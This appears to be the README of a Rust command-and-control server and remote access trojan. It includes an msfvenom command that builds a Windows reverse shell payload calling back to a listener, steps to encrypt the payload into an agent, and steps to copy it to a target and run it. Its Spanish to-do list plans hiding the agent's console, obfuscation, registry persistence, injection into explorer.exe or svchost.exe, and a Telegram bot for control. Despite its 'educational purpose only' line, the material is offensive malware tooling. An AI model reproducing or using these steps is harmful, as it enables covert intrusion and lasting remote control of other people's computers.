# C2R2
C2 and Rat written in Rust

## Educational purpose only, do not use it for illegal activities.

## How to Use (Linux)

### Prerequisites
- Rust toolchain installed (`curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh`)
- Git installed

### Building the Project
```bash
# Clone the repository
git clone <repository-url>
cd C2R2

# Build in release mode
cargo build -p c2r2-server --release
cargo build --release -p builder
❯ msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.110.129 LPORT=4444 -f raw -o rev.bin
❯ ./builder --encrypt rev.bin
./builder ../../rev.bin --name agent_test --server 192.168.110.129:4444
# The binaries will be located in target/release/
```

### Running the Listener
```bash
# Run the C2 listener
./target/release/listener

# Or with custom port
./target/release/listener --port 4444
```

### Deploying the Agent
```bash
# Transfer the agent binary to target system
scp target/release/agent user@target:/tmp/

# Execute on target (example)
./agent --server <listener-ip>:4444
```

https://github.com/1N73LL1G3NC3x/Nightmangle/tree/master?tab=readme-ov-file

## ToDo


- [x] Que no aparezca la consola del agente
- [x] Crear un listener para tener multiples conexiones simultaneas con diferentes agentes
- [ ] Mejorar la ofuscación del agente

### Crear persistencia
- [ ] Cuando se ejecute el agente, que se copie a %APPDATA% y se añada al registro para que se ejecute al iniciar sesión o al iniciar el sistema.
- [ ] Que se pueda inyectar en un proceso legítimo (explorer.exe, svchost.exe, etc)


### Listener
- [ ] Crear un listener con sockets para tener multiples conexiones simultaneas con diferentes agentes
- [x] Cuando se manda un comando que se haga de manera asíncrona para no bloquear la comunicación con el agente y además de una manera más sigilosa (threads, async/await, sleep, etc)
- [ ] Crear un servidor que se encargue de recibir las conexiones de los agentes y enviarles comandos y que este servidor se comunique con la interfaz C2 (Telegram bot, web, etc)

### Interfaz C2
- [ ] Crear una interfaz mediante Telegram bot que permita enviar comandos y recibir respuestas de los agentes

